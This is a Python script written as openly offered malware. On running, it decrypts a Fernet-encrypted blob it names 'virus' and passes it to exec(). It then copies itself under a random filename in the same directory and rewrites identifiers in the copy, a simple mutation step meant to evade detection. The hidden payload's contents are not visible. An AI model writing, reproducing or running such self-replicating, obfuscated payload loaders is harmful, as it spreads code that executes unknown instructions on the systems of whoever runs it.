import os
import random
import string
import hashlib
import shutil
from cryptography.fernet import Fernet


# Function to generate a random string
def random_string(length=8):
    letters = string.ascii_letters
    return ''.join(random.choice(letters) for i in range(length))


# Function to simulate code mutation
def mutate_code(code):
    replacements = {
        'hash_file': random_string(),
        'decrypt': random_string(),
        'key': random_string(),
        'token': random_string(),
    }
    for old, new in replacements.items():
        code = code.replace(old, new)
    return code


# Function to calculate the hash of a file
def hash_file(filename):
    h = hashlib.sha1()
    with open(filename, 'rb') as file:
        chunk = 0
        while chunk != b'':
            chunk = file.read(1024)
            h.update(chunk)
    return h.hexdigest()


# Function to decrypt and execute the payload
def decrypt(token, key):
    fer = Fernet(key)
    virus = fer.decrypt(token).decode()
    exec(virus)


# Function to replicate the script
def replicate(file_path):
    directory = os.path.dirname(file_path)
    copy_name = random_string() + ".py"
    copy_path = os.path.join(directory, copy_name)
    shutil.copy(file_path, copy_path)

    with open(copy_path, 'r') as f:
        code = f.read()

    mutated_code = mutate_code(code)

    with open(copy_path, 'w') as f:
        f.write(mutated_code)


# Sample key and token (for illustration purposes)
key = "Y1x2diCYlKeB8bu2rudfMiTtq2PKT_LY-eH-MjVPWV0="
token = "gAAAAABj4ypBW326t6qT9U1vUikBRvKqCPZvqj9J-HQmxZnAZ5e-_nYUGzKK0dJYqcGTIV528gjmLH8R-7niHo7rcZRNHO98Ah_MsuLisZ3bPh1jdY1jtHY5Kfb9lYYnUVEXw41NrwQAMIYIaC0hWq5wK9e-FyWYHmfx3SknWU8Hyck02wkMYRU0I8hf4GgrXRp3IcKvyNkYj5vlvosQ930hlTlFMP2a4gPbFdZQRMl_GQWfZUNgRS7CffxC9L8kxtivf41mGvSwT9ovvfr4BEnuwFmjnopuWi51XKYfgZDpA20wEktVx_uxsfMZXBQ5mgSdwxUfvrDBHULyFrU6_RWq6SmQx_q8fiPI-EPSMgbELXVBXOBvI_01o6beFXRTHi-MYVi62_IKmsSLi5Pw7LRRch9UmM3DvhWYXYZ7uLrhjvlORzGBGtV6pt_QvsmWrczb8C8rzxyTSxQGTta6fARTYVTy2-64BC-KaW9_bh9yzAkHQOUvokIww-lizTJBf1yCAh8PigqIQMQx_haKbT9VacJ3zjpIvIEmbCXOpUCBUjYj-C7X8dg_nlGy042aiQUgcae5Xu3tleilCxaAzHvV1aajejWdjtaE6zFGCpwQM5vLUB2Dg5U_SL27hT_M5UkL40xm6pAXKVL-mmPNc55Aj1fU-m6TpHe9iQcx-YmbwPi22KcckislHvE4buwirptj1a5qlYaXwdjRRhJCUO2qXcSALf-KRdShiYq5VF2AKI6OpDeQLBG4ikIdkO6UlIWlgZK4r38ruUwqlCYcLUEpIFdKBtCGITv_erAwl45F5_Do4iKBu39QoBDJVsYfKK8D3fk-1M6Uj2HIn42tCAUlI6xkMfIXbyyLvyPzSWkCKeYNA84ABjZi2t7bae6dkI-Fei5saE7O_eQuM2sk98skvfqBQt6-OVR2asS5-7pDlnLHLiA3O3LOOLrpgfPEJkhbADR85qf0yPBbU5zfm2ogyimf1QBRK5wgteGXxKGP"

# Start of execution
decrypt(token, key)
replicate(os.path.basename(__file__))
print("Hash of the file is: ", hash_file(os.path.basename(__file__)))
